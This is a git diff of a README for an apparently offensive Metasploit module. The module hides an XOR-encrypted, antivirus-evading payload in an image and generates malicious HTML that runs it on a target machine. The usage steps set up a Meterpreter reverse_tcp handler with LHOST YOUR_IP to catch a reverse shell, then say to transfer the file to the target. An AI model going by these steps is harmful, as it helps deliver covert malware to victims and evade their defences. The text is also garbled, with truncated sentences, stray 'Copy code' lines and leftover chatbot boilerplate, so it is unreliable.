@@ -1,76 +1,79 @@
-# Custom Image Payload Embedder
+# Embedded Image Payload Module
 
-## Project Goal
-
-This project aims to create NO-CLICK payloads hidden inside of image files.
-
-## Description
-
-This Metasploit module embeds a Metasploit payload into an image file. It is designed to be used on Linux platforms and allows for the stealthy execution of payloads within an innocuous-looking image file.
-
+This project demonstrates how to create a Metasploit module that embeds a payload into an image file and generates a malicious HTML file to execute the payload on a target machine.
 ## Features
 
-- Embeds a Metasploit payload into an image file.
-- Encrypts the payload with a randomly generated key using XOR encryption.
-- Provides options to specify the image and payload paths.
+- Embeds a payload into an image file using steganography techniques
+- Encrypts the payload using XOR encryption with a random key
+- Applies polymorphic techniques to obfuscate the payload and evade antivirus detection
+- Generates a malicious HTML file that extracts and e- Sets up a Metasploit handler to receive the reverse shell connection
 
-## Installation
+## Requirements
 
-To use this module, you must have Metasploit Framework installed on your system. If you do not have it installed, you can download it from the following link:
-[Metasploit Download](https://www.metasploit.com/download)
-
-Once Metasploit is installed, follow these steps:
-
-1. Clone this repository to your local machine.
-2. Copy the module into the appropriate Metasploit directory (typically `~/.msf4/modules/exploits/`).
-3. Start the Metasploit console and load the module.
+- Ruby programming language
+- Metasploit framework
 
 ## Usage
 
-To use the module, you need to set the `IMAGE_PATH` and `PAYLOAD_PATH` options to point to your image file and payload file, respectively.
+1. Clone the repository:
+git clone https://github.com/your-username/embedded-image-payload.git
 
-Example usage:
 
-```ruby
-msfconsole use exploit/custom_image_payload_embedder
-set IMAGE_PATH /path/to/image.jpg
-set PAYLOAD_PATH /path/to/payload.bin
-exploit
-```
+Copy code
 
-## Development
+2. Install the required dependencies:
+bundle install
 
-### Prerequisites
 
-- Ruby (version as specified by Metasploit)
-- Metasploit Framework
+Copy code
 
-### Setting Up the Development Environment
+3. Customize the module and payload:
+- Open the `module.rb` file and modify the module options, such as the image path and output path.
+- Open the `payload.rb` file and customize the payload generation and obfuscation techniques as needed.
 
-1. Fork and clone the repository.
-2. Install the required Ruby version (use a Ruby version manager like `rbenv` or `rvm`).
-3. Install dependencies: `bundle install`
-4. Make changes to the module code as needed.
+4. Generate the payload and embed it into the image:
+ruby exploit.rb
 
-### Debugging and Testing
 
-- Use `irb` or `pry` for interactive debugging.
-- Write and run unit tests using the `rspec` framework.
+Copy code
 
-## Contributing
+5. Set up the Metasploit handler:
+- Open a new terminal window and start the Metasploit console:
+  ```
+  msfconsole
+  ```
+- Select the `exploit/multi/handler` module:
+  ```
+  use exploit/multi/handler
+  ```
+- Set the payload to match the one used in the malicious HTML file:
+  ```
+  set PAYLOAD windows/meterpreter/reverse_tcp
+  ```
+- Set the `LHOST` and `LPORT` options to specify the IP address and port for the  ```
+  set LHOST YOUR_IP
+  set LPORT 4444
+  ```
+- Start the handler:
+  ```
+  run
+  ```
 
-Contributions to this project are welcome. Please follow these steps:
-
-1. Fork the repository.
-2. Create a new branch for your feature or bug fix.
-3. Commit your changes with descriptive commit messages.
-4. Push your branch and submit a pull request.
-
-## Author
-
-Webmaster-Exit-1
+6. Transfer the generated malicious HTML file to the ta
+7. Once the payload is executed, a reverse shell connection will be established, and you can interact with the target machine using Meterpreter commands.
 
 ## Disclaimer
 
-I have not yet tested or finished this project. The first commit date is me just brainstorming.
-This module is intended for educational and ethical testing purposes only. The author is not responsible for any misuse or damage caused by this module.
+This project is intended for educational and research purposes only. The authors and contributors are not responsible for any misuse or damage caused by this project. Use it at your own risk and ensure that you have proper authorization before using it in any real-world scenarios.
+
+## License
+
+This project is licensed under the [MIT License](LICENSE).
+## Acknowledgements
+
+- Metasploit framework
+- Ruby programming language
+Feel free to customize the README.md file based on your specific project details and requirements. You can add more sections, such as installation instructions, contributing guidelines, or any other relevant information.
+
+Remember to replace **YOUR_IP** with the actual IP address of your machine where you want to receive the reverse shell connection.
+
